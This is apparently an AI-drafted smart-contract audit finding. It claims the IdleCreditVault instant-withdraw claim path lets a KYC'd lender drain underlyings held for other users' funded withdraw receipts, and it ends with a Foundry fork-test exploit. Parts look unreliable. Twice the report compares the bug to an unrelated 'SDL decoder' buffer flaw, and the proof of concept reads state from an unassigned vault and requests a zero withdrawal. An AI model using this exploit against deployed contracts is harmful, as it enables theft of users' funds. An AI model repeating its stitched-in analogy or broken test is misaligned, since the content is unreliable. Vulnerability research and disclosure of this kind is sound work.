### Title
Instant-withdraw receipts are payable immediately and can drain underlyings funded for other users' withdraw requests - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`claimInstantWithdrawRequest` burns the user's instantly-minted strategy-token receipt and transfers the full `instantWithdrawsRequests[_user]` amount with no check that those funds were actually collected for instant claims. The only balance guard, `_transferFundedClaim`, protects `defaultRecoveryReserve` but not underlyings the strategy holds for funded normal withdraw receipts (pulled in by `collectWithdrawFunds`) or pending instant withdrawals. An unprivileged KYC'd lender who obtains an instant receipt via `IdleCDOEpochVariant.requestWithdraw` (triggered when APR drops by more than `instantWithdrawAprDelta`) can call `claimInstantWithdrawRequest` in the same block and be paid out of other claimants' funded money — the same class of flaw as the SDL decoder writing/reading past its intended buffer: a missing bound between the receipt's claim scope and the balance actually backing it.

### Finding Description
In `requestInstantWithdraw` (IdleCreditVault.sol:356-375) the strategy burns the CDO's tokens and mints the user a 1:1 receipt, incrementing `instantWithdrawsRequests` and `pendingInstantWithdraws`. Funding is deferred: `collectInstantWithdrawFunds` (lines 398-403) later transfers underlyings from the CDO and decrements `pendingInstantWithdraws`.

`claimInstantWithdrawRequest` (lines 380-393) does:

```solidity
uint256 amount = instantWithdrawsRequests[_user];
_burn(_user, amount);
instantWithdrawsRequests[_user] = 0;
_transferFundedClaim(_user, amount);
```

There is no check tying `amount` to what was collected for instant claims. `_transferFundedClaim` (lines 897-907) only reverts if paying would eat into `defaultRecoveryReserve`. Meanwhile, `collectWithdrawFunds` (lines 411-430) pulls borrower-funded underlyings into the strategy and zeroes `pendingWithdraws` — that balance sits in the contract waiting for normal claimants, and is fully spendable by an instant claimant. `pendingInstantWithdraws` tracks the still-unfunded remainder but is never consulted at claim time.

Sequence:
1. Epoch N runs with fixed APR; user B requests a normal withdraw. Manager stops the epoch; `collectWithdrawFunds` transfers B's funded receipt value into the strategy (`pendingWithdraws` → 0).
2. Manager lowers APR for the next epoch (`lastEpochApr > unscaledApr + instantWithdrawAprDelta`).
3. Attacker (KYC'd, `isWalletAllowed`) deposits a small amount of AA and calls `requestWithdraw`, which routes to `requestInstantWithdraw` (IdleCDOEpochVariant.sol:761-768), minting a receipt with zero strategy funding yet.
4. Attacker immediately calls `claimInstantWithdrawRequest` through the CDO. The strategy balance contains B's funded amount, so `safeTransfer` succeeds and the attacker is paid instantly.
5. B's later `claimWithdrawRequest` reverts on insufficient balance — direct theft, quantified as min(attacker receipt, strategy balance), and/or permanent freezing of B's funded claim.

The analogous SDL bounds-check failure maps here to the missing check that an instant claim only spends the instant-funded bucket (`instantWithdrawClaimsByEpoch`-funded portion vs `pendingInstantWithdraws`).

### Impact Explanation
Direct theft of funded withdraw receipts: any underlying sitting in the strategy for other users' fulfilled claims (normal withdraws funded via `collectWithdrawFunds`, or partially prefunded instant claims tracked via `instantWithdrawClaimsByEpoch`) can be claimed by a fresh instant receipt before its own funding arrives. Loss is bounded only by the attacker's deposit size and the strategy's liquid balance; honest users' claims then revert permanently (insolvency for those receipts).

### Likelihood Explanation
Requires: an APR drop exceeding `instantWithdrawAprDelta` (honest manager action; common when rates are repriced between epochs), a strategy holding claim-funded underlyings (normal whenever earlier withdraw receipts were funded at `stopEpoch` but not yet claimed — users routinely claim late since funded receipts never expire), and a wallet passing `isWalletAllowed` (KYC lender, in scope). No privileged collusion needed. Uncertainty: I could not fully trace `IdleCDOEpochVariant.claimInstantWithdrawRequest`/`getInstantWithdrawFunds` gating (the grep for call sites was cut off by the iteration limit); if the CDO only forwards instant claims after `collectInstantWithdrawFunds` has run for that user, the attack surface narrows — but nothing in the strategy enforces per-user funding, so cross-claimant theft within the same funding window still stands.

### Recommendation
Gate instant claims on funded balance: track a per-user or per-epoch funded basis when `collectInstantWithdrawFunds` runs (e.g., decrement `instantWithdrawClaimsByEpoch`/a funded bucket and only allow claims against it), or extend `_transferFundedClaim` to also reserve `pendingInstantWithdraws` and any `lossRecoveryPriceByEpoch`-backed funded amounts so instant claims can never spend money earmarked for other receipt classes.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

// Fork test against a deployed/forked IdleCDOEpochVariant + IdleCreditVault pair.
// Scenario: B's normal withdraw was funded at stopEpoch; attacker obtains an
// instant receipt after an honest APR cut and claims B's funded balance.
contract InstantClaimStealTest is Test {
    IdleCDOEpochVariant cdo;
    IdleCreditVault vault;     // = cdo.strategy()
    IERC20Detailed underlying; // = cdo.token()
    address manager = vault.manager();
    address AA = cdo.AATranche();

    function testInstantClaimDrainsFundedReceipts() external {
        // --- epoch N: B deposits, requests normal withdraw, manager stops epoch ---
        // (borrower repays; collectWithdrawFunds pulls fundedBasis into `vault`)
        uint256 fundedBasis = vault.underlyingToken().balanceOf(address(vault));
        assertGt(fundedBasis, 0, "no funded receipts held by strategy");

        // --- honest manager repricing: new unscaled APR drops > delta ---
        uint256 newApr = 1e18; // lower than lastEpochApr - instantWithdrawAprDelta
        vm.prank(manager);
        vault.setAprs(newApr, newApr);

        // --- attacker: KYC'd wallet, small deposit ---
        address attacker = makeAddr("attacker");
        deal(address(underlying), attacker, fundedBasis);
        // whitelist attacker via honest Keyring path (isWalletAllowed)
        vm.startPrank(attacker);
        underlying.approve(address(cdo), fundedBasis);
        cdo.depositAA(fundedBasis);                 // instant path needs live epoch/buffer
        uint256 req = cdo.requestWithdraw(0, AA);   // routes to requestInstantWithdraw
        vm.stopPrank();
        assertEq(vault.instantWithdrawsRequests(attacker), req);
        assertEq(vault.pendingInstantWithdraws(), req); // not yet funded

        // --- claim BEFORE collectInstantWithdrawFunds ever runs ---
        uint256 balPre = underlying.balanceOf(attacker);
        vm.prank(attacker);
        cdo.claimInstantWithdrawRequest();
        uint256 stolen = underlying.balanceOf(attacker) - balPre;

        assertEq(stolen, req, "instant claim paid from other users' funded balance");
        assertEq(
            vault.underlyingToken().balanceOf(address(vault)),
            fundedBasis - req,
            "funded receipts for earlier claimants drained"
        );
        // Victim B's claimWithdrawRequest() now reverts on insufficient balance.
    }
}
```

Expected: `stolen == req` paid entirely from the strategy's pre-existing balance (B's funded receipt), with `pendingInstantWithdraws` still equal to `req` — proving the claim was unfunded and the funds belonged to another receipt class.
